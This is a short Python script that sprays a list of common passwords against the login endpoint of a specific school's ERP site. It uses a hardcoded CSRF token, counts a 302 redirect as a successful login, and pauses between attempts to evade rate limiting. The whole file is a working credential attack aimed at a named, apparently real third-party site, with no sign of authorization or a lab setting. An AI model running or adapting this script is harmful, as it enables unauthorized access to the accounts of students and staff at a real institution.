#!/usr/bin/env python3
import requests
import time

# Common passwords to test
common_passwords = [
    'password', 'password123', 'admin', 'admin123',
    '123456', '12345678', 'qwerty', 'abc123',
    'letmein', 'welcome', 'monkey', 'sunshine'
]

def password_spray(username):
    for password in common_passwords:
        data = {
            'school_csrf_name': '7cc8790c3af66959d835ea5952d53247',
            'email': username,
            'password': password
        }
        
        r = requests.post('https://arunodoiacademy.org/erp_new/authentication', 
                         data=data, allow_redirects=False)
        
        # Check for successful login indicators
        if r.status_code == 302:  # Redirect after login
            print(f"[+] Success! {username}:{password}")
            return True
        
        time.sleep(2)  # Avoid rate limiting
    
    return False

# Test with discovered usernames
